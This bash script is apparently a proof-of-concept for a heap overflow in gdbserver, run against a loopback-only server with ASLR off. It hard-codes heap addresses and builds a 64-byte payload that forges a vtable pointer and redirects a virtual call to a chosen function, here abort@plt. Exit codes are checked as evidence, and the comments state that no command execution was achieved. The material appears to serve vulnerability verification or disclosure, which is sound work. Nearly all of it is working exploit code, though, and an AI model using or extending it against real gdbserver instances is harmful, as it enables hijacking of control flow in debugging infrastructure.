#!/bin/bash
# Wire-only forged-vtable replay against the plant-started, loopback-only
# plain pinned gdbserver with ASLR disabled (setarch -R).  No debugger.
#
# Under this exact invocation and environment the object address is stable:
#   src  = xmalloc(2)            = 0x55555561c410
#   obj  = adjacent tdesc_feature = 0x55555561c430
#   vptr slot target             = obj+8 = 0x55555561c438
# The 64 decoded bytes are:
#   0..23  filler inside src
#  24..31  next chunk size, kept at 0x61
#  32..39  vptr = obj+8 (fake vtable inside the corrupted object)
#  40..55  first two fake-vtable slots (unused)
#  56..63  fake slot +0x10 = chosen function address
# With abort@plt (0x555555561f70) the process dies SIGABRT (134) with no
# debugger.  A short packet and a well-formed packet exit 0.  Retargeting
# the slot to _exit@plt, exit@plt, getpid@plt or a bare ret gadget did NOT
# give a clean distinctive exit (SIGILL/SIGSEGV) -- see PROVENANCE; no
# command execution was demonstrated.  Clients connect only to loopback.
# The object address is per-build AND per-parent-environment: witness W139
# measured c460 from a bash parent and c420 from a Python parent with an
# otherwise identical pinned binary. Re-derive it before replaying here.
set -u
BIN=${1:?need plain gdbserver binary}
HERE=$(cd "$(dirname "$0")" && pwd)
E="$HERE/evidence"
mkdir -p "$E"
PORT=34840
FAIL=0

payload() {
  local slot=$1
  printf '%s610000000000000038c4615555550000%s%s' \
    "$(printf '41%.0s' {1..24})" "$(printf '42%.0s' {1..16})" "$slot"
}

run_case() {
  local tag=$1 payload_hex=$2 expect=$3 slen=${4:-1}
  PORT=$((PORT+1))
  local log="$E/aslr-off-$tag.log"
  setarch -R "$BIN" --once --debug=remote "127.0.0.1:$PORT" /bin/true \
    >"$log" 2>&1 &
  local s=$!
  for _ in $(seq 1 100); do
    grep -q 'Listening on port' "$log" 2>/dev/null && break
    sleep 0.1
  done
  python3 "$HERE/live_probe_hex.py" "$PORT" "$payload_hex" "$slen" \
    >"$E/aslr-off-$tag.client.out" 2>&1
  wait "$s"
  local rc=$?
  if [ "$rc" = "$expect" ]; then
    echo "PASS $tag SERVER_RC=$rc EXPECT=$expect"
  else
    echo "FAIL $tag SERVER_RC=$rc EXPECT=$expect"
    FAIL=$((FAIL+1))
  fi
}

ABORT_HEX=$(payload '701f565555550000')

FILL8=$(printf '41%.0s' {1..8})
SAFE16=$(printf '43%.0s' {1..16})

run_case abort-marker "$ABORT_HEX" 134

run_case short-8 "$FILL8" 0
run_case safe-16 "$SAFE16" 0 16

echo "TOTAL FAIL=$FAIL"
exit "$FAIL"
